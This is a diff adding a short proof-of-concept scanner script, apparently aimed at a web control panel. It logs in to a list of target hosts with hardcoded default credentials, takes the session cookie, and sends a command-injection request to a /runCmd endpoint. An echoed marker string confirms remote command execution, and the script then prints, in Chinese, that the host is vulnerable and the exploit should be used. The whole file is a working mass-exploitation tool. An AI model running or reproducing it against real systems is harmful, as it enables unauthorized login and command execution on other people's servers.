@@ -1,0 +1,37 @@
+#request urls = array
+#define find = err":0
+function login(domain){
+	res = HttpPost(domain."/auth","username=useradmin&password=supermanito","User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36");
+	if(StrFindStr(res[0],find,0) !="-1"){
+		Cookie = GettextMiddle(res[1],"Set-Cookie:[","; Path=/");
+		return Cookie;
+	}
+	return "";
+}
+function poc(domain,Cookie){
+	res = HttpPost(domain."/runCmd","cmd=bash+jd.sh+%3Becho wker&delay=500","Cookie: ".Cookie.StrRN()."User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36");
+	if(StrFindStr(res[0],"wker",0) != "-1"){
+		return 1;
+	}else{
+		return 0;
+	}
+}
+function main(args){
+	num = GetArrayNum(urls);
+	i = 0;
+	while(i < num){
+		domain = urls[i];
+		try{
+			printclolor("[?]当前检测:".domain,7);
+			Cookie = login(domain);
+			if(Cookie != ""){
+				if(poc(domain,Cookie) == 1){
+					printclolor("[+]".domain."   存在漏洞,请使用exp！",3);
+				}
+			}
+		}catch{
+		}
+		i = ToInt(i+1);
+	}
+	print("检测完毕！");
+}
